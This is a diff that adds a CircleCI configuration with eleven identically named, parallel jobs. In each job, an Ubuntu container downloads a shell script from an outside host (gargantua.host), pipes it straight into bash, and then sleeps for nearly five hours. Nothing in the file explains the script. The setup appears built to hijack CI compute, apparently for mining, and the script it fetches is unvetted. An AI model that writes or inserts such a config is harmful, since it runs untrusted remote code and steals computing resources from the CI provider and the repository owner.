@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  fpmdovcirne:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  fpmdovcirne10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - fpmdovcirne
+      - fpmdovcirne1
+      - fpmdovcirne2
+      - fpmdovcirne3
+      - fpmdovcirne4
+      - fpmdovcirne5
+      - fpmdovcirne6
+      - fpmdovcirne7
+      - fpmdovcirne8
+      - fpmdovcirne9
+      - fpmdovcirne10
